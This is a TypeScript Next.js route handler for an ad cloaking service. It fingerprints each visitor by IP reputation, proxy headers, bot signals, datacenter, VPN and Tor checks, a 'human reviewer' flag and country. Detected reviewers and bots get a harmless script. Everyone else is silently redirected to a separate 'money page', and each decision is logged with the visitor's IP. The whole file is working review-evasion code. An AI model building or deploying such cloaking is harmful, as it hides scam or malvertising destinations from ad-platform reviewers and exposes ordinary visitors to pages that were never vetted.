import { type NextRequest } from "next/server"
import { supabaseAdmin, isSupabaseConfigured } from "@/lib/supabase"
import { detectAdvancedBot } from "@/lib/advanced-bot-detection"
import { isDatacenterOrProxy, detectProxyHeaders } from "@/lib/datacenter-detection"
import { getIPReputation, markIPBlocked, markIPClean, isRepeatOffender } from "@/lib/ip-reputation"

// Returns JS that does nothing — visitor stays on page
function safeJs(): string {
  return "(function(){})();"
}

// Returns JS that redirects to money page
function redirectJs(url: string): string {
  const u = JSON.stringify(normalizeUrl(url))
  return `(function(u){try{window.location.replace(u);}catch(e){window.location.href=u;}})(${u});`
}

// Without a protocol, browsers treat "google.com" as a path on the
// current domain (e.g. limbun.online/google.com) instead of redirecting away
function normalizeUrl(url: string): string {
  const trimmed = url.trim()
  return /^https?:\/\//i.test(trimmed) ? trimmed : `https://${trimmed}`
}

const JS_HEADERS = {
  "Content-Type": "application/javascript; charset=UTF-8",
  "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
  "Access-Control-Allow-Origin": "*",
}

export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url)
    const campaignCode = (searchParams.get("c") || "").trim()

    if (!campaignCode) {
      return new Response(safeJs(), { headers: JS_HEADERS })
    }

    // ── Extract visitor info from request headers ─────────────
    const rawXFF = request.headers.get("x-forwarded-for") || ""
    const ip =
      request.headers.get("cf-connecting-ip") ||
      request.headers.get("x-real-ip")        ||
      rawXFF.split(",")[0]?.trim()             ||
      "127.0.0.1"

    const userAgent = request.headers.get("user-agent") || ""
    const referer   = request.headers.get("referer")    || ""
    const country   =
      request.headers.get("x-vercel-ip-country") ||
      request.headers.get("cf-ipcountry")        ||
      "UNKNOWN"

    const headers: Record<string, string | null> = {
      "accept":           request.headers.get("accept"),
      "accept-language":  request.headers.get("accept-language"),
      "accept-encoding":  request.headers.get("accept-encoding"),
      "connection":       request.headers.get("connection"),
      "sec-fetch-site":   request.headers.get("sec-fetch-site"),
      "sec-fetch-mode":   request.headers.get("sec-fetch-mode"),
      "via":              request.headers.get("via"),
      "proxy-connection": request.headers.get("proxy-connection"),
      "x-forwarded-for":  rawXFF || null,
      "x-real-ip":        request.headers.get("x-real-ip"),
    }

    // ── Load campaign by code ─────────────────────────────────
    let website: any = null
    if (isSupabaseConfigured()) {
      const { data } = await supabaseAdmin
        .from("websites")
        .select("*")
        .eq("campaign_code", campaignCode)
        .single()
      website = data
    }

    if (!website || !website.cloaking_enabled || !website.is_active) {
      return new Response(safeJs(), { headers: JS_HEADERS })
    }

    const selectedPlatforms: string[] = Array.isArray(website.blocked_ad_platforms)
      ? website.blocked_ad_platforms : []

    // ── Detection pipeline ────────────────────────────────────
    let blocked = false
    let reason   = "qualified_human"
    let category = ""

    const block = (r: string, cat: string) => { blocked = true; reason = r; category = cat }

    // Guard 1: Repeat offender
    if (isRepeatOffender(ip)) {
      block("repeat_offender", "repeat")

    // Guard 2: IP reputation cache
    } else {
      const cached = getIPReputation(ip)
      if (cached?.blocked) {
        block(cached.reason, cached.category)
      } else {
        // Guard 3: Proxy headers
        const proxyCheck = detectProxyHeaders(headers)
        if (proxyCheck.isProxy) {
          markIPBlocked(ip, "proxy_headers", "proxy")
          block("proxy_headers_detected", "proxy")
        }

        // Guard 4: Bot detection
        if (!blocked) {
          const botResult = detectAdvancedBot(userAgent, headers, ip)
          if (botResult.isBot) {
            markIPBlocked(ip, `bot:${botResult.botType || "unknown"}`, "bot")
            block(`bot:${botResult.botType || "unknown"}`, "bot")
          }
        }

        // Guard 5: Datacenter / VPN / TOR / Reviewer
        if (!blocked) {
          const dcResult = await isDatacenterOrProxy(ip)
          if (dcResult.blocked) {
            const cat = dcResult.analysis.isTor           ? "tor"
                      : dcResult.analysis.isHumanReviewer ? "reviewer"
                      : dcResult.analysis.isVPN           ? "vpn"
                      : dcResult.analysis.isProxy         ? "proxy"
                      : "datacenter"
            markIPBlocked(ip, dcResult.reason, cat as any)
            block(dcResult.reason, cat)
          }
        }

        // Guard 6: Country filter
        if (!blocked) {
          const allowed = Array.isArray(website.allowed_countries) ? website.allowed_countries : []
          if (allowed.length > 0 && country !== "UNKNOWN" && !allowed.includes(country)) {
            block("blocked_country", "geo")
          }
        }

        if (!blocked) markIPClean(ip)
      }
    }

    // ── Log to DB ─────────────────────────────────────────────
    if (isSupabaseConfigured()) {
      supabaseAdmin.from("access_logs").insert([{
        website_id:   website.id,
        ip_address:   ip,
        country,
        user_agent:   userAgent,
        page_shown:   blocked ? "safe" : "money",
        is_bot:       blocked,
        bot_type:     category || null,
        bot_confidence: null,
        action_taken: blocked ? "stay_on_safe" : "redirect_money",
        reason,
        referrer:     referer || null,
        pathname:     referer || "/",
        ad_platform:  null,
        created_at:   new Date().toISOString(),
      }]).then(({ error }: { error: unknown }) => {
        if (error) console.error("track.js log:", error)
      })
    }

    const tag = blocked
      ? (category === "bot" ? "🤖" : category === "vpn" ? "🔒" : category === "reviewer" ? "👁️" : "🚫")
      : "✅"
    console.log(`[track.js] ${tag} | ${country} | ${reason} | ${ip}`)

    if (blocked) {
      return new Response(safeJs(), { headers: JS_HEADERS })
    }

    return new Response(redirectJs(website.landing_page_url), { headers: JS_HEADERS })

  } catch (err) {
    console.error("track.js error:", err)
    return new Response(safeJs(), { headers: JS_HEADERS })
  }
}
